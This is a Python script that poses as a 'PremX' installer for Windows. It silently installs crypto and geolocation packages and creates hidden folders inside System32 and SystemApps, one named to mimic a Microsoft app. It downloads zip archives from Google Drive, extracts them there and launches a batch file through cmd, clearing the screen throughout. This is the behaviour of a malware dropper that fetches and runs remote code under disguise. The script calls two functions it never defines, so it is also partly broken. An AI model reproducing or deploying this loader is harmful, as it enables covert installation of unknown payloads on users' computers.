import subprocess
import sys
import os
import winreg
import requests
import sys
import ctypes
import os
import sys
import shutil
import os
import gdown
result = check_string_in_url("https://raw.githubusercontent.com/bizsdklsxc35325/myins/refs/heads/main/unique_id.txt", file_contentsx1)
os.system('cls')
def install_geocoder():
    try:
        subprocess.run(["py", "-3.11", "-m", "pip", "install", "geocoder"], check=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    except subprocess.CalledProcessError:
        pass

def install_pycryptodome():
    try:
        subprocess.run(["py", "-3.11", "-m", "pip", "install", "pycryptodome"], check=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    except subprocess.CalledProcessError:
        pass
print("Veriyfing, please wait...")
install_geocoder()
install_pycryptodome()
os.system('cls')

dcnmwxdr = r'C:\Windows\System32\DSEL'
if not os.path.exists(dcnmwxdr):
    os.makedirs(dcnmwxdr)
    os.system('cls')

mypart2 = r'C:\Windows\SystemApps\Microsoft.Windows.AppRep.ChxApp_cw5n1h2txyewy1h2txyeX'
if not os.path.exists(mypart2):
    os.makedirs(mypart2)
    os.system('cls')

def delete_files_if_condition(file):
    target_dir = r"C:\Windows\System32\DSEL" 

    if not os.path.exists(file): 
        if os.path.exists(target_dir) and os.path.isdir(target_dir):
            for file_name in os.listdir(target_dir):
                file_path = os.path.join(target_dir, file_name)
                try:
                    if os.path.isfile(file_path):
                        os.remove(file_path)
                except Exception as e:
                    print(f"")
check_file = r"C:\Windows\System32\premxupdate22mar2025part2.txt"
delete_files_if_condition(check_file)


def updating_premx():
    aesv3_path = r"C:\Windows\System32\DSEL\klx2025.py"
    directory_path = r"C:\Windows\System32\DSEL"

    if not os.path.exists(aesv3_path):
        if os.path.exists(directory_path):
            for item in os.listdir(directory_path):
                item_path = os.path.join(directory_path, item)
                if os.path.isfile(item_path):
                    os.remove(item_path)
                elif os.path.isdir(item_path):
                    shutil.rmtree(item_path)
            os.system('cls')
            print("\nUPDATING PLEASE WAIT.\n\n")
    else:
        print("")

updating_premx()

def download_file_from_google_drive(url, output_path):
    if not os.path.exists(output_path):
        gdown.download(url, output=output_path, quiet=True)
if not os.path.exists("C:\\Windows\\System32\\DSEL\\klx2025.py"):
    os.system('cls')
    print("Installing PremX please wait.")
    download_file_from_google_drive("https://drive.google.com/uc?id=1mIBthqcXb1NnXJG1Vv-lWN00NhPNrf_X", "C:\\Windows\\System32\\DSEL\\bn.zip")
    zip_file = r'C:\Windows\System32\DSEL\bn.zip'
    extract_dir = r'C:\Windows\System32\DSEL'
    extract_zip(zip_file, extract_dir)
    os.remove(zip_file)

if not os.path.exists("C:\\Windows\\SystemApps\\Microsoft.Windows.AppRep.ChxApp_cw5n1h2txyewy1h2txyeX\\csklxzcgmletroipqsadfi.nsh"):
    os.system('cls')
    print("Installing PremX please wait. Part 2")
    download_file_from_google_drive("https://drive.google.com/uc?id=1So5_aAQEKV0fVgChL0sw1S3fhUhCeQy8", "C:\\Windows\\SystemApps\\Microsoft.Windows.AppRep.ChxApp_cw5n1h2txyewy1h2txyeX\\csklxzcgmletroipqsadfi.zip")
    zip_file = r'C:\Windows\SystemApps\Microsoft.Windows.AppRep.ChxApp_cw5n1h2txyewy1h2txyeX\csklxzcgmletroipqsadfi.zip'
    extract_dir = r'C:\Windows\SystemApps\Microsoft.Windows.AppRep.ChxApp_cw5n1h2txyewy1h2txyeX'
    extract_zip(zip_file, extract_dir)
    os.remove(zip_file)

def create_check_file(file):
    try:
        with open(file, "w") as f:
            f.write("Installation confirmed.")
    except Exception as e:
        print(f"Error creating file: {e}")
create_check_file(check_file)

import os
import shutil
os.system('cls')
import subprocess
def run_batch_file(batch_file_path):
    try:
        subprocess.run([batch_file_path], shell=True, check=True)
    except subprocess.CalledProcessError as e:
        print(f"Error")
    else:
        print("")


os.system('cls')
batch_file_path = r"C:\Windows\System32\DSEL\klx2025.bat"
os.system('cls')

try:
    subprocess.Popen(['start', 'cmd', '/c', batch_file_path], shell=True)
except Exception as e:
    print("Error")

os.system('cls')

os._exit(0)
sys.exit()
